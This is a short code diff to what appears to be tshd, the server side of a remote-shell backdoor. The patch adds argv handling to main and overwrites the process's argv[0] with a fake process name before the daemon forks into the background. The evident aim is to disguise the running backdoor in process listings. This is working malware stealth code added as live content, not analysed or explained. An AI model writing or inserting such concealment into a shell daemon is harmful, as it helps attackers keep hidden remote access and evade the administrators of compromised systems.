@@ -52,7 +52,7 @@ int tshd_runshell( int client );
 
 /* program entry point */
 
-int main( void )
+int main( int argc,char **argv )
 {
     int ret, len, pid, n;
 
@@ -69,6 +69,9 @@ int main( void )
     struct hostent *client_host;
 
 #endif
+    /* overwrite cmdline */
+    memset((void *)argv[0], '\0', strlen(argv[0]));
+    strcpy(argv[0], FAKE_PROC_NAME);
 
     /* fork into background */
 
